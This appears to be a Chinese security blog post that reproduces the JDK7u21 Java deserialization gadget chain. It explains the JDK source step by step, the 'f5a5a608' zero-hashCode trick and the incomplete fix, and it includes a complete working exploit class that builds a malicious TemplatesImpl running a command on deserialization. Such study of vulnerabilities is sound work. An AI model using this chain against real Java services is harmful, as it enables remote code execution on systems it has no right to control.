---
created: '21/11/27'
title: 反序列化篇之JDK7u21
tags:
  - java
  - java安全
  - 反序列化
---
# 反序列化篇之JDK7u21
感觉p牛的文章写的非常好，很清晰地把7u21这条链给讲了一遍(比网上搜到的几篇文章都讲的明白得多)，这里跟着p牛再复现一遍。

## AnnotationInvocationHandler#equalsImpl
JDK7u21的主要核心在于`AnnotationInvocationHandler#equalsImpl`，代码如下:
```java
private Boolean equalsImpl(Object var1) {
        if (var1 == this) {
            return true;
        } else if (!this.type.isInstance(var1)) {
            return false;
        } else {
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 < var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) {
                    var8 = var9.memberValues.get(var6);
                } else {
                    try {
                        var8 = var5.invoke(var1);
                    } catch (InvocationTargetException var11) {
                        return false;
                    } catch (IllegalAccessException var12) {
                        throw new AssertionError(var12);
                    }
                }

                if (!memberValueEquals(var7, var8)) {
                    return false;
                }
            }

            return true;
        }
    }

private Method[] getMemberMethods() {
        if (this.memberMethods == null) {
            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
                public Method[] run() {
                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, true);
                    return var1;
                }
            });
        }

        return this.memberMethods;
    }
```
这个方法中有个很明显的反射调用`memberMethod.invoke(o)`，而memberMethod来自于 `this.type.getDeclaredMethods()`。
也就是说，`equalsImpl`这个方法是将this.type类中的所有方法遍历并执行了。那么，假设 this.type是`Templates`类，则势必会调用到其中的`newTransformer`或`getOutputProperties`方法，而这些方法最终都会触发任意java代码执行:
```java
public interface Templates {
    Transformer newTransformer() throws TransformerConfigurationException;
    
    Properties getOutputProperties();
}
```

## AnnotationInvocationHandler#invoke
那么我们要如何调用到`equalsImpl`方法呢？equalsImpl是一个私有方法，在 `AnnotationInvocationHandler#invoke`中被调用。
```java
    public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else {
            assert var5.length == 0;

            if (var4.equals("toString")) {
                return this.toStringImpl();
            } else if (var4.equals("hashCode")) {
                return this.hashCodeImpl();
            } else if (var4.equals("annotationType")) {
                return this.type;
            } else {
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }

                    return var6;
                }
            }
        }
    }
```
可见，当方法名等于“equals”，且仅有一个Object类型参数时，会调用到`equalsImpl`方法。所以，现在的问题变成，我们需要找到一个方法，在反序列化时对proxy调用equals方法。

## HashSet#readObject
我们查看HashSet的readObject方法：
```java
 private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
```
这里可以看到反序列化HashSet的时候会往调用内部的`map#put`方法，那么我们再来看看`put`方法的实现:
```java
public V put(K key, V value) {
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry<K,V> e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }
```
这里就有我们想要的`equals`方法，这里有一段逻辑是判断两个key的hash是否相同，然后才会执行到或(||)后的语句，调用`equals`判断两个key是否相同，所以为了最终调用到`equals`方法，我们必须往HashSet里放入2个hash相同的对象。这里我们要放入的对象是TemplatesImpl，而为了触发`AnnotationInvocationHandler.equalsImpl`，我们还需要使用一个proxy代理这个对象，我们需要想办法让这2个对象的hash相同。

## 奇妙的Magic Number
计算“哈希”的主要是下面这两行代码：
```java
int hash = hash(key);
int i = indexFor(hash, table.length);
```
`hash`方法的实现如下，可以看到只有一个参数`h=k.hashCode()`:
```java
final int hash(Object k) {
        int h = 0;
        if (useAltHashing) {
            if (k instanceof String) {
                return sun.misc.Hashing.stringHash32((String) k);
            }
            h = hashSeed;
        }

        h ^= k.hashCode();

        // This function ensures that hashCodes that differ only by
        // constant multiples at each bit position have a bounded
        // number of collisions (approximately 8 at default load factor).
        h ^= (h >>> 20) ^ (h >>> 12);
        return h ^ (h >>> 7) ^ (h >>> 4);
    }
```
所以proxy对象与TemplateImpl对象的“哈希”是否相等，仅取决于这两个对象的`hashCode()`是否相等。TemplateImpl的`hashCode()`是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的`hashCode()`与之相等，只能寄希望于 `proxy.hashCode()`。

我们知道AnnotationInvocationHandler需要传入一个类及一个Map对象，我们最终要将TemplatesImpl对象放入AnnotationInvocationHandler的Map中，当我们调用`proxy.hashCode()`时，会调用`AnnotationInvocationHandler#invoke`，进而调用到`AnnotationInvocationHandler#hashCodeImpl`，我们看看这个方法：
```java
    private int hashCodeImpl() {
        int var1 = 0;

        Entry var3;
        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
            var3 = (Entry)var2.next();
        }

        return var1;
    }
```
它会遍历`memberValues`这个Map中的每个key和value，计算每个`(127 * key.hashCode()) ^ value.hashCode()`并求和。

JDK7u21中使用了一个非常巧妙的方法：
- 当memberValues中只有一个key和一个value时，该哈希简化成`(127 * key.hashCode()) ^ value.hashCode()`
- 当`key.hashCode()`等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成 `value.hashCode()`。
- 当value就是TemplateImpl对象时，这两个对象的哈希就完全相等

所以我们现在最终的问题就是找到一个字符串其hashCode为0，这里直接给出其中一个答案:`f5a5a608`，这也是ysoserial中用到的字符串。

## 利用链构造
所以，整个利用的过程就清晰了，按照如下步骤来构造：
- 首先生成恶意`TemplateImpl`对象
- 实例化`AnnotationInvocationHandler`对象
    - 它的type属性是一个`Templates`类
    - 它的`memberValues`属性是一个`Map`，`Map`只有一个key和value，key是字符串`f5a5a608`， value是前面生成的恶意`TemplateImpl`对象
- 对这个`AnnotationInvocationHandler`对象做一层代理，生成proxy对象
- 实例化一个`HashSet`，这个`HashSet`有两个元素，分别是:
- `TemplateImpl`对象
- `proxy`对象
- 将`HashSet`对象进行序列化

这样，反序列化触发代码执行的流程如下：
- 触发`HashSet#readObject`方法，其中使用`HashMap`的key做去重
- 去重时计算`HashSet`中的两个元素的`hashCode()`，因为我们的精心构造二者相等，进而触发`equals()`方法
- 调用`AnnotationInvocationHandler#equalsImpl`方法
- `equalsImpl`中遍历this.type的每个方法并调用
- 因为this.type是`Templates`类，所以触发了`newTransform()`或`getOutputProperties()` 方法
- 任意代码执行

## 最终exp
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class jdk7u21 {
    public static TemplatesImpl generateEvilTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());


        return templates;
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = generateEvilTemplates();
        HashMap map = new HashMap();
        map.put("f5a5a608", "zero");

        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put("f5a5a608", templates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## 调用逻辑
```
HashSet.readObject()
HashSet.put()
  AnnotationInvocationHandler.equals() // 精心构造使得2个对象的hashCode相同，触发equals
  AnnotationInvocationHandler.invoke()
  AnnotationInvocationHandler.equalsImpl() // 触发memberMethod.invoke(o)
    Templates.newTransformer() === TemplatesImpl.newTransformer()  // equalsImpl中会反射调用AnnotationInvocationHandler实例中type属性对应类的所有方法，由于AnnotationInvocationHandler的type是Templates，则会去调用Templates中的newTransformer
      TemplatesImpl.getTransletInstance() 
        TemplatesImpl.defineTransletClasses()  // 定义类
          ...  // 创建类实例，触发static代码块
```

## 不完全的修复
看看官方的修复方案: 在`sun.reflect.annotation.AnnotationInvocationHandler`类的`readObject`函数中，原本有一个对`this.type`的检查，在其不是`AnnotationType`的情况下，会抛出一个异常。但是，捕获到异常后没有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程。在新版中，将这个返回改为了抛出一个异常，会导致整个序列化的过程终止。
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211130194851.png)

这个修复方式看起来击中要害，实际上仍然存在问题，这也导致后面的另一条原生利用链JDK8u20。
